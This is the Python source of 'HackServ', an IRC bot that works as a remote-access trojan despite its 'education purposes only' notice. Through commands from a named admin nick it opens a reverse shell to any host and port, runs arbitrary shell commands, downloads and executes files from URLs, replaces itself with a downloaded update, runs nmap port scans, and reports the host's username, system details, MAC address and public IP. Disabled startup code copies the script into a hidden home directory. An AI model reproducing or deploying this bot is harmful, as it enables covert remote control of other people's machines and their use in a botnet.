#!/usr/bin/env python3
#
# HackServ IRC Bot
# hackserv.py
#
# Copyright (c) 2018-2021 Stephen Harris <trackmastersteve@gmail.com>
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

legal_notice = 'THIS BOT IS FOR EDUCATION PURPOSES ONLY! DO NOT USE IT FOR MALICIOUS INTENT!'
author = 'Stephen Harris (trackmastersteve@gmail.com)'
github = 'https://github.com/trackmastersteve/hackserv.git'
software = 'HackServ'
version = '0.9.9'
last_modification = '2021.03.28'

# Imports
import os
import ssl
import sys
import nmap
import time
import uuid
import shlex
import base64
import random
import socket
import datetime
import platform
import threading
import subprocess
import urllib.request
from requests import get
starttime = datetime.datetime.utcnow() # Start time is used to calculate uptime.
ip = get('https://api.ipify.org').text # Get public IP address. (used to set botnick-to-ip as well as the '.ip' command.)

#################################################
############# Booleans ##########################
debugmode = False # If True, all print msgs will be active. (use False if you want to run in the background)
usessl = True # Connect using SSL. (True or False)
useservpass = False # Use a password to connect to IRC Server. (True or False)
usesasl = False # Authenticate using SASL. (True or False)
enableshell = True # Enable Shell commands. (True or False)
#################################################
############# Bot Settings ######################
server = "irc.freenode.net" # Server to connect to.
port = 6697 # Port to connect to.
serverpass = "password" # Password for IRC Server. (UnrealIRCD uses this as default NickServ ident method)
channel = "#arm0red" # Channel to join on connect.
#botnick = "botnick" # Your bots IRC nick.
#botnick = "ip" + ip.replace(".", "_") # Set bots nick to IP address, but in proper IRC nick compatible format.
botnick = "hs["+ str(random.randint(10000,99999)) +"]" # Set bots IRC Nick to 'hs' + 5 random numbers.
nspass = "password" # Bots NickServ password.
nickserv = "NickServ" # Nickname service name. (sometimes it's differnet on some networks.)
adminname = "arm0red" # Bot Master's IRC nick.
exitcode = "bye" # Command 'exitcode + botnick' is used to kill the bot.
#################################################
#################################################





lastping = time.time() # Time at last PING.
threshold = 200 # Ping timeout before reconnect.
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Set ircsock variable.
if usessl: # If SSL is True, connect using SSL.
    ircsock = ssl.wrap_socket(ircsock)
ircsock.settimeout(240) # Set socket timeout.
connected = False # Variable to say if bot is connected or not.

def ircsend(msg):
    ircsock.send(bytes(str(msg) +"\n", "UTF-8")) # Send data to IRC server.

def connect():
    global connected
    while not connected:
        try: # Try and connect to the IRC server.
            if debugmode: # If debugmode is True, msgs will print to screen.
                print("Connecting to " + str(server) + ":" + str(port))
            ircsock.connect_ex((server, port)) # Here we connect to the server.
            if usesasl:
                ircsend("CAP REQ :sasl") # Request SASL Authentication.
                if debugmode:
                    print("Requesting SASL login.")
            if useservpass: # If useservpass is True, send serverpass to server to connect.
                ircsend("PASS "+ serverpass) # Send the server password to connect to password protected IRC server.
            ircsend("USER "+ botnick +" "+ botnick +" "+ botnick +" "+ botnick+ " "+ botnick) # We are basically filling out a form with this line and saying to set all the fields to the bot nickname.
            ircsend("NICK "+ botnick) # Assign the nick to the bot.
            connected = True
            main()
        except Exception as iconnex: # If you can't connect, wait 10 seconds and try again.
            if debugmode: # If debugmode is True, msgs will print to screen.
                print("Exception: " + str(iconnex))
                print("Failed to connect to " + str(server) + ":" + str(port) + ". Retrying in 10 seconds...")
            connected = False
            time.sleep(10)
            reconnect()

def reconnect():
    global connected # Set 'connected' variable
    global ircsock # Set 'ircsock' variable
    while not connected:
        ircsock.close() # Close previous socket.
        ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Set ircsock variable.
        if usessl: # If SSL is True, connect using SSL.
            ircsock = ssl.wrap_socket(ircsock) 
        try:
            if debugmode: # If debugmode is True, msgs will print to screen.
                print("Reconnecting to " + str(server) + ":" + str(port))
            ircsock.connect_ex((server, port)) # Here we connect to the server.
            if usesasl:
                ircsend("CAP REQ :sasl") # Request SASL Authentication.
                if debugmode:
                    print("Requesting SASL login.")            
            if useservpass: # If useservpass is True, send serverpass to server to connect.
                ircsend("PASS "+ serverpass) # Send the server password to connect to password protected IRC server.
            ircsend("USER "+ botnick +" "+ botnick +" "+ botnick +" "+ botnick +" "+ botnick) # We are basically filling out a form with this line and saying to set all the fields to the bot nickname.
            ircsend("NICK "+ botnick) # Assign the nick to the bot.
            connected = True
            main()
        except Exception as irconnex: # If you can't connect, wait 10 seconds and try again.
            if debugmode: # If debugmode is True, msgs will print to screen.
                print("Exception: " + str(irconnex))
                print("Failed to reconnect to " + str(server) + ":" + str(port) + ". Retrying in 10 seconds...")
            connected = False
            time.sleep(10)
            reconnect()
            
def joinchan(chan): # Join channel(s).
    ircsend("JOIN "+ chan)
    ircmsg = ""
    while ircmsg.find("End of /NAMES list.") == -1:
        ircmsg = ircsock.recv(2048).decode("UTF-8")
        ircmsg = ircmsg.strip('\n\r')
        if debugmode: # If debugmode is True, msgs will print to screen.
            print(ircmsg) # Print messages to the screen. (won't allow bot to run in the background.)

def partchan(chan): # Part channel(s).
    ircsend("PART "+ chan)
        
def pjchan(chan): # Part then Join channel(s) 
    ircsend("PART "+ chan)
    ircsend("JOIN "+ chan)
    
def newnick(newnick): # Change botnick.
    ircsend("NICK "+ newnick)

def sendmsg(msg, target=channel): # Sends messages to the target.
    ircsend("PRIVMSG "+ target +" :"+ msg)

def sendntc(ntc, target=channel): # Sends a NOTICE to the target.
    ircsend("NOTICE "+ target +" :"+ ntc)
    
def sendversion(nick, ver): # Respond to VERSION request.
    ver = "VERSION " + software + ' ' + version + ' Download it at: ' + github
    sendntc(ver, nick)
    
def kick(msg, usr, chan): # Kick a user from the channel.
    ircsend("KICK "+ chan + " " + usr + " :"+ msg)
    
def uptime(): # Used to get current uptime for .uptime command
    delta = datetime.timedelta(seconds=round((datetime.datetime.utcnow() - starttime).total_seconds()))
    return delta

def uname(): # Used to get system info for .uname command
    sysinfo = platform.uname()
    return sysinfo

def username(): # Used to get the OS username for .username command.
    usrnm = os.getenv('USER', os.getenv('USERNAME', 'user'))
    return usrnm

def macaddress(): # Used to get macaddress for .macaddress command.
    ma = ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
    return ma

def linuxMemory(): # Get linux system memory info for .memory command.
    sendntc("Memory Info: ", adminname)
    with open("/proc/meminfo", "r") as f:
        lines = f.readlines()

    sendntc("     " + lines[0].strip(), adminname)
    sendntc("     " + lines[1].strip(), adminname)

def nmapScan(tgtHost, tgtPort): # Use nmap to scan ports on an ip address with .scan command
    nmScan = nmap.PortScanner()
    nmScan.scan(tgtHost, tgtPort)
    state = nmScan[tgtHost]['tcp'][int(tgtPort)]['state']
    if state == 'open':
        st = '[+]'
    else:
        st = '[-]'
    sendmsg((st + " " + tgtHost + " tcp/" +tgtPort + " -" + state), adminname)

def rShell(rsHost, rsPort): # Open a reverse shell on this device.
    try:
        rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        rs.connect_ex((str(rsHost), int(rsPort)))
        rs.sendto(str.encode("[+] Connection established!"), (str(rsHost), int(rsPort)))
        rsConnected = True
        if debugmode:
            print("[+] Connection established with " + rsHost + ":" + rsPort + "!")
        while rsConnected:
            try:
                data = rs.recv(1024).decode("UTF-8")
                if data == "quit":
                    rs.close()
                    sendntc("[x] Closed reverse shell connection with "+ rsHost +":"+ rsPort +"!", adminname)
                    if debugmode:
                        print("[x] Closed reverse shell connection with "+ rsHost +":"+ rsPort +"!")
                if data[:2] == "cd":
                    os.chdir(data[3:])
                if len(data) > 0:
                    sproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = sproc.stdout.read() + sproc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")
                    currentWD = os.getcwd() + "> "
                    rs.sendto(str.encode(currentWD + output_str), (str(rsHost), int(rsPort)))
            except Exception as rsex:
                if debugmode:
                    print("rShell Exception: " + str(rsex))
                    rsConnected = False
    except Exception as rsconnex:
        if debugmode:
            print("rShell Socket Connection Exception: " + str(rsconnex))
    rs.close()
    
def runcmd(sc): # Run shell commands on this device.
    proc = subprocess.Popen(shlex.split(sc), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    while True:
        line = proc.stdout.readline()
        line_str = str(line, "UTF-8")
        if line == b'' and proc.poll() is not None:
            if debugmode:
                print("End of .cmd output.")
            sendntc("Shell>", adminname)
            return
        if line:
            if debugmode:
                print(format(line_str))
            sendntc("Shell> " + format(line_str), adminname)
    pp = proc.poll()
    if debugmode:
        print(pp)
    sendntc(pp, adminname)
    sendntc("Shell> Done.", adminname)
    
def runcmd_noout(sc): # Run shell commands with any feedback output.
    proc = subprocess.Popen(sc, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

def setmode(flag, target=channel): # Sets given mode to nick or channel.
    ircsend("MODE "+ target +" "+ flag)
    
def download(link, file): # Download a file.
    urllib.request.urlretrieve(str(link), str(file))
    sendntc(str(file) +" was successfully downloaded from "+ str(link) +"!", adminname)

def execute(xType, file): # Run executable file.
    if xType == 'ex':
        exec(open(str(file)).read())
    if type == 'sys':
        os.system(str(file))
    else:
        runcmd_noout('./'+ file)
    
def chFileMod(modFile, modType):
    os.chmod(str(modFile), str(modType))
    sendntc(str(modFile) +" mode was changed to: "+ str(modType) +"!", adminname)

def update(link, dlFile): # Update bot.
    download(link, dlFile)
    chFileMod(str(dlFile), stat.S_IXUSR)
    os.rename("hackserv.py", "hackserv.py.bak")
    os.rename(str(dlFile), "hackserv.py")
    runcmd_noout("./hackserv.py")
    sendntc(str(dlFile) +" was renamed and old 'hackserv.py' was successsfully backed up and updated!", adminname)
    #sys.exit()
    
def retrieveFile(fsname, fs, fsaddr): # Receive a file.
    filename = fs.recv(1024).decode("UTF-8")
    if os.path.isfile(filename):
        fs.sendto(str.encode("EXISTS " + str(os.path.getsize(filename))), fsaddr)
        userResponse = fs.recv(1024).decode("UTF-8")
        if userResponse[:2] == 'OK':
            with open(filename, 'rb') as f:
                bytesToSend = f.read(1024)
                fs.sendto(bytesToSend, fsaddr)
                while bytesToSend != "":
                    bytesToSend = f.read(1024)
                    fs.sendto(bytesToSend, fsaddr)
    else:
        fs.sendto(str.encode("ERR"), fsaddr)
    fs.close()

def fileServer(): # Open a file server on this device.
    host = '127.0.0.1'
    port = 4444
    s = socket.socket()
    s.bind((host, port))
    s.listen(5)
    if debugmode:
        print("[*] File Server (Download) started!")
    sendntc("[*] File Server (Download) started!", adminname)
    while True:
        c, addr = s.accept()
        if debugmode:
            print("[+] Client connected ip: " + str(addr))
        sendntc("[+] Client connected ip: " + str(addr), adminname)
        t = threading.Thread(target=retrieveFile, args=("retreiveThread", c, addr))
        t.start()
    s.close()

def srtChk(): # Startup Check.
    script = sys.argv
    name = str(script[0])
    hd = str(os.path.expanduser('~'))
    hdPath = hd + '/.arm0red'
    clone = hdPath + '/hackserv.py'
    if name == clone:
        if debugmode:
            print(name + " and "+ clone + " are the same file!")
            connect()
            #print("Cloned bot is already running!")
    else:
        try:
            if debugmode:
                print("NAME: " + name)
                print("CLONE: " + clone)
                print("HOME DIR: " + hd)
            if os.path.isdir(hdPath) and os.path.exists(hdPath):
                if debugmode:
                    print("Directory Exists: " + hdPath)
            else:
                if debugmode:
                    print("Creating Directory: " + hdPath)
                os.mkdir(hdPath)#, 0700)
            if os.path.isfile(clone):
                if debugmode:
                    print("Bot File Exists: " + clone)
            else:
                if name != clone:
                    if debugmode:
                        print("Copying " + name + " to: " + clone)
                    os.system("cp " + name + " " + clone)
            if debugmode:
                print("Running: " + clone)
                runcmd(clone)
                #os.system(clone)
        except OSError as mdr:
            if debugmode:
                print("ERROR: " + str(mdr))

def main():
    global connected
    global botnick
    global ip
    global lastping
    while connected:
        ircmsg = ircsock.recv(2048).decode("UTF-8")
        ircmsg = ircmsg.strip('\n\r')
        if debugmode: # If debugmode is True, msgs will print to screen.
            print(ircmsg) # Print messages to the screen. (won't allow bot to run in the background.)
        
        # SASL Authentication.
        if ircmsg.find("ACK :sasl") != -1:
            if usesasl:
                if debugmode:
                    print("Authenticating with SASL PLAIN.") # Request PLAIN Auth.
                ircsend("AUTHENTICATE PLAIN")
        if ircmsg.find("AUTHENTICATE +") != -1:
            if usesasl:
                if debugmode:
                    print("Sending %s Password: %s to SASL." % (nickserv, nspass))
                authpass = botnick + '\x00' + botnick + '\x00' + nspass
                ap_encoded = str(base64.b64encode(authpass.encode("UTF-8")), "UTF-8")
                ircsend("AUTHENTICATE " + ap_encoded) # Authenticate with SASL.
        if ircmsg.find("SASL authentication successful") != -1:
            if usesasl:
                if debugmode:
                    print("Sending CAP END command.")
                ircsend("CAP END") # End the SASL Authentication.
        
        # Wait 30 seconds and try to reconnect if 'too many connections from this IP'
        if ircmsg.find('Too many connections from your IP') != -1:
            if debugmode: # If debugmode is True, msgs will print to screen.
                print("Too many connections from this IP! Reconnecting in 30 seconds...")
            connected = False
            time.sleep(30)
            reconnect()
        
        # Change nickname if current nickname is already in use.
        if ircmsg.find('Nickname is already in use') != -1:
            botnick = "hs[" + str(random.randint(10000,99999)) +"]"
            newnick(botnick)
        
        # Join 'channel' and msg 'admin' after you are fully connected to server.
        if ircmsg.find('NOTICE') != -1:
            name = ircmsg.split('!',1)[0][1:]
            message = ircmsg.split('NOTICE',1)[1].split(':',1)[1]
            if message.find('*** You are connected') != -1:
                #sendmsg("IDENTIFY %s" % nspass, nickserv)
                joinchan(channel)
                sendntc(format(ip) + " Online!", adminname)
                
            # Respond to NickServ ident request.
            if name.lower() == nickserv.lower() and message.find('This nickname is registered') != -1:
                sendmsg("IDENTIFY " + nspass, nickserv)
                
        # Respond to CTCP VERSION
        if ircmsg.find('VERSION') != -1:
            name = ircmsg.split('!',1)[0][1:]
            vers = version
            sendversion(name, vers)
            
        # Messages come in from IRC in the format of: ":[Nick]!~[hostname]@[IPAddress]PRIVMSG[channel]:[message]"
        if ircmsg.find('PRIVMSG') != -1:
            name = ircmsg.split('!',1)[0][1:]
            message = ircmsg.split('PRIVMSG',1)[1].split(':',1)[1]

            # IRC Nicks are normally less than 17 characters long.
            if len(name) < 17:
                # Respond to anyone saying 'Hi [botnick]'.
                if message.find('Hi ' + botnick) != -1:
                    sendntc("Hello " + name + "!", name)

                # Respond to '.msg [target] [message]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.msg') != -1:
                    target = message.split(' ', 1)[1]
                    if target.find(' ') != -1:
                        message = target.split(' ', 1)[1]
                        target = target.split(' ')[0]
                    else:
                        target = name
                        message = "Could not parse. The message should be in format of '.msg [target] [message]' to work properly."
                    sendmsg(message, target)

                # Respond to '.ntc [target] [message]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.ntc') != -1:
                    target = message.split(' ', 1)[1]
                    if target.find(' ') != -1:
                        message = target.split(' ', 1)[1]
                        target = target.split(' ')[0]
                    else:
                        target = name
                        message = "Could not parse. The message should be in the format of '.notice [target] [message]' to work properly."
                    sendntc(message, target)
                
                # Respond to '.kick [channel] [nick] [reason]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.kick') != -1:
                    target = message.split(' ', 1)[1]
                    if target.find(' ') != -1:
                        reason = target.split(' ', 2)[2]
                        nick = target.split(' ')[1]
                        chnl = target.split(' ')[0]
                        message = nick + " was kicked from " + chnl + " Reason:" + reason
                        kick(reason, nick, chnl)
                    else:
                        message = "Could not parse. The message should be in the format of '.kick [#channel] [nick] [reason]' to work properly."
                    sendntc(message, name)
                
                # Respond to the '.mode [target] [mode]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.mode') != -1:
                    target = message.split(' ', 1)[1]
                    if target.find(' ') != -1:
                        mode = target.split(' ', 1)[1]
                        target = target.split(' ')[0]
                        message = "Setting mode " + mode + " on " + target + "!"
                        setmode(mode, target)
                    else:
                        message = "Could not parse. The message should be in the format of '.mode [target] [mode]' to work properly."
                    sendntc(message, adminname)
                
                # Respond to the '.dl [url] [file]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.dl') != -1:
                    target = message.split(' ', 1)[1]
                    if target.find(' ') != -1:
                        download_file = target.split(' ', 1)[1]
                        download_url = target.split(' ')[0]
                        message = "The file " + download_file + " is downloading from " + download_url + "..."
                        download_thread = threading.Thread(target=download, args=(download_url, download_file))
                        download_thread.start()
                    else:
                        message = "Could not parse. The message should be in the format of '.dl [url] [file]' to work properly."
                    sendntc(message, adminname)
                               
                # Respond to the '.run [execute type] [executable file]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.run') != -1:
                    target = message.split(' ', 1)[1]
                    if target.find(' ') != -1:
                        exec_file = message.split(' ', 1)[1]
                        exec_type = message.split(' ')[0]
                        message = "Running the executable file: " + exec_file + " Using: " + exec_type
                        execute_thread = threading.Thread(target=execute, args=(exec_type, exec_file))
                        execute_thread.start()
                    else:
                        message = "Could not parse. The message should be in the format of '.run [exec type] [exec file]' to work properly."
                    sendntc(message, adminname)
                
                # Respond to the '.raw [command]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.raw') != -1:
                    if message.split(' ', 1)[1] != -1:
                        rawc = message.split(' ', 1)[1]
                        message = "Sending '" + rawc + "' to the server!"
                        ircsend(rawc)
                    else:
                        message = "Could not parse. The message should be in the format of '.raw [command]' to work properly."
                    sendntc(message, adminname)
                
                # Respond to the '.nick [newnick]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.nick') != -1:
                    if message.split(' ', 1)[1] != -1:
                        botnick = message.split(' ', 1)[1]
                        message = "Ok, Changing my nick to: " + botnick
                        newnick(botnick)
                    else:
                        message = "Could not parse. Please make sure the command is in the format of '.nick [newnick]' to work properly."
                    sendntc(message, name)
                
                # Respond to the '.join [channel]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.join') != -1:
                    if message.split(' ', 1)[1].startswith('#'):
                        target = message.split(' ', 1)[1]
                        message = "Ok, I will join the channel: " + target
                        joinchan(target)
                    else:
                        message = "Could not parse. Please make sure the channel is in the format of '#channel'."
                    sendntc(message, name)
                
                # Respond to the '.part [channel]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.part') != -1:
                    if message.split(' ', 1)[1].startswith('#'):
                        target = message.split(' ', 1)[1]
                        message = "Ok, I will part the channel: " + target
                        partchan(target)
                    else:
                        message = "Could not parse. Please make sure the channel is in the format of '#channel'."
                    sendntc(message, name)

                # Respond to the '.pj [channel]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.pj') != -1:
                    if message.split(' ', 1)[1].startswith('#'):
                        target = message.split(' ', 1)[1]
                        message = "Ok, cycling " + target + " now!"
                        pjchan(target)
                    else:
                        message = "Could not parse. Please make sure the channel is in the format of '#channel'."
                    sendntc(message, name)
                
                # Respond to the '.help' command.
                if message.find('.help') != -1:
                    message = "End of Help."
                    if name.lower() == adminname.lower():
                        helpmsg = """
                                  '.help' (shows this message),
                                  '.username' (shows username of machine the bot is running on),
                                  '.uptime' (shows bot uptime),
                                  '.uname' (get 1-line system info),
                                  '.sysinfo' (get formated system info),
                                  '.osversion' (get OS version info),
                                  '.memory' (get memory stats info),
                                  '.ip' (get public ip address of bot),
                                  '.macaddress' (get mac address info),
                                  '.rsh [target] [port]' (opens reverse shell to target),
                                  ....listener can be downloaded at https://github.com/trackmastersteve/shell.git,
                                  '.cmd [shell command]' (run shell commands on the host),
                                  '.cno [shell command]' (run shell commands without output),
                                  '.fsdl' (run fileserver to download files from),
                                  '.scan [ip] [comma seperated ports]' (nmap port scanner),
                                  '.msg [target] [message]' (sends a msg to a user/channel),
                                  '.ntc [target] [message]' (sends a notice to a user/channel),
                                  '.join [channel]' (tells bot to join channel),
                                  '.part [channel]' (tells bot to part channel),
                                  '.pj [channel]' (tells bot to part then rejoin channel),
                                  '.kick [channel] [nick] [reason]' (tells bot to kick a user from a channel),
                                  '.mode [target] [mode]' (set mode on nick or channel),
                                  '.nick [newnick]' (sets a new botnick),
                                  '.raw [command]' (sends a raw command to the IRC server),
                                  '.dl [url] [file] (downloads [url] and saves as [file]),
                                  '.run [execute type] [executable file]' (execute a file),
                                  '.upgrade [link] file]' (upgrades the hackserv.py file),
                                  'Hi [botnick]' (responds to any user saying hello to it),
                                  'bye [botnick]' (tells bot to quit)
                                  """
                    else:
                        helpmsg = """
                                  '.help' (shows this message),
                                  'Hi [botnick]' (responds to any user saying hello to it)
                                  """
                    helpmsg = [m.strip() for m in str(helpmsg).split(',')]
                    for line in helpmsg:
                        sendntc(line, name)
                        time.sleep(1)
                    sendntc(message, name)
                
                # Respond to '.ip' command from admin.
                if name.lower() == adminname.lower() and message.find('.ip') != -1:
                    ip = get('https://api.ipify.org').text
                    sendntc("My public ip address is: " + format(ip), name)
                
                # Respond to '.uptime' command from admin.
                if name.lower() == adminname.lower() and message.find('.uptime') != -1:
                    sendntc("My current uptime: " + format(uptime()), name)
                    
                # Respond to '.uname' command from admin.
                if name.lower() == adminname.lower() and message.find('.uname') != -1:
                    sendntc("System Info: " + format(uname()), adminname)
                    
                # Respond to '.username' command from admin.
                if name.lower() == adminname.lower() and message.find('.username') != -1:
                    sendntc("Username: " + format(username()), adminname)
                    
                # Respond to '.macaddress' command from admin.
                if name.lower() == adminname.lower() and message.find('.macaddress') != -1:
                    sendntc("Mac Address: " + format(macaddress()), adminname)
                    
                # Respond to '.sysinfo' command from admin.
                if name.lower() == adminname.lower() and message.find('.sysinfo') != -1:
                    # System
                    sendntc("System: " + format(platform.system()), adminname)
                    # Node
                    sendntc("Node: " + format(platform.node()), adminname)
                    # Release
                    sendntc("Release: " + format(platform.release()), adminname)
                    # Version
                    sendntc("Version: " + format(platform.version()), adminname)
                    # Architecture
                    sendntc("Architecture: " + format(platform.architecture()[0]), adminname)
                    # Machine
                    sendntc("Machine: " + format(platform.machine()), adminname)
                    
                # Respond to '.osversion' command from admin.
                if name.lower() == adminname.lower() and message.find('.osversion') != -1:
                    sendntc("OS Version: " + format(platform.version()), adminname)
                    
                # Respond to '.memory' command from admin.
                if name.lower() == adminname.lower() and message.find('.memory') != -1:
                    if platform.system() == 'Linux':
                        message = "End of Memory Info."
                        linuxMemory()
                    else:
                        message = "Only Linux is currently supported."
                    sendntc(message, name)
                                
                # Respond to '.upgrade [link] [file]' command from admin.
                if name.lower() == adminname.lower() and message.find('.upgrade') != -1:
                    target = message.split(' ', 1)[1]
                    if target.find(' ') != -1:
                        message = "Update sucessful!"
                        uFile = target.split(' ', 1)[1]
                        target = target.split(' ')[0]
                        update_thread = threading.Thread(target=update, args=(target, uFile))
                        update_thread.start()
                    else:
                        message = "Could not parse. The command should be in the format of '.update [link] [file]' to work properly."
                    sendntc(message, adminname)
                               
                # Respond to '.scan [target] [port(s)]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.scan') != -1:
                    target = message.split(' ', 1)[1]
                    if target.find(' ') != -1:
                        message = "nmap scan has completed!"
                        ports = target.split(' ', 1)[1]
                        target = target.split(' ')[0]
                        ports = [s.strip() for s in str(ports).split(',')] 
                        for port in ports: # loops through comma seperated list of ports.
                            nmapScan_thread = threading.Thread(target=nmapScan, args=(target, port))
                            nmapScan_thread.start()
                    else:
                        message = "Could not parse. The command should be in the format of '.scan [targetIP] [comma,seperated,ports]' to work properly."
                    sendntc(message, adminname)

                # Respond to '.rsh [target] [port]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.rsh') != -1:
                    if enableshell:
                        target = message.split(' ', 1)[1]
                        if target.find(' ') != -1:
                            port = target.split(' ', 1)[1]
                            target = target.split(' ')[0]
                            message = "[+] Reverse shell connection established with " + target + ":" + port + "!"
                            rshell_thread = threading.Thread(target=rShell, args=(target,port))
                            rshell_thread.start()
                        else:
                            message = "Could not parse. The command should be in the format of '.rshell [target] [port]' to work properly."
                        sendntc(message, adminname)
                    else:
                        sendntc("Shell commands are disabled!", adminname)
                
                # Respond to '.fsdl [target] [port]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.fsdl') != -1:
                    fileServer()

                # Respond to '.cmd [shell command]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.cmd') != -1:
                    if enableshell:
                        if message.split(' ', 1)[1] != -1:
                            shellcmd = message.split(' ', 1)[1]
                            message = "Shell> " + shellcmd
                            runcmd_thread = threading.Thread(target=runcmd, args=(shellcmd,))
                            runcmd_thread.start()
                        else:
                            message = "Could not parse. The command should be in the format of '.cmd [shell command]' to work properly."
                        sendntc(message, adminname)
                    else:
                        sendntc("Shell commands are disabled!", adminname)
                
                 # Respond to '.cno [shell command]' command from admin.
                if name.lower() == adminname.lower() and message[:5].find('.cno') != -1:
                    if enableshell:
                        if message.split(' ', 1)[1] != -1:
                            shellcmd = message.split(' ', 1)[1]
                            message = "Shell> " + shellcmd
                            runcmd_noout_thread = threading.Thread(target=runcmd_noout, args=(shellcmd,))
                            runcmd_noout_thread.start()
                        else:
                            message = "Could not parse. The command should be in the format of '.cno [shell command]' to work properly."
                        sendntc(message, adminname)
                    else:
                        sendntc("Shell commands are disabled!", adminname)
                
               # Respond to 'exitcode botnick' from admin.
                if name.lower() == adminname.lower() and message.rstrip() == exitcode + " " + botnick:
                    sendmsg("Okay, Bye!")
                    ircsend("QUIT Killed by " + adminname)
                    sys.exit()

        else:
            if ircmsg.find("PING") != -1: # Reply to PINGs.
                nospoof = ircmsg.split(' ', 1)[1] # Unrealircd 'nospoof' compatibility.
                ircsend("PONG " + nospoof)
                lastping = time.time() # Set time of last PING.
                if (time.time() - lastping) >= threshold: # If last PING was longer than set threshold, try and reconnect.
                    if debugmode: # If debugmode is True, msgs will print to screen.
                        print('PING time exceeded threshold')
                    connected = False
                    reconnect()
                
            if not ircmsg: # If no response from server, try and reconnect.
                if debugmode: # If debugmode is True, msgs will print to screen.
                    print('Disconnected from server')
                connected = False
                reconnect()
                
try: # Here is where we actually start the Bot.
    if not connected:
        #srtChk() # Check if file exists.
        connect() # Connect to server.
    
except KeyboardInterrupt: # Kill Bot from CLI using CTRL+C
    ircsend("QUIT Terminated Bot using [ctrl + c]")
    if debugmode: # If debugmode is True, msgs will print to screen.
        print('... Terminated Bot using [ctrl + c], Shutting down!')
    sys.exit()
    
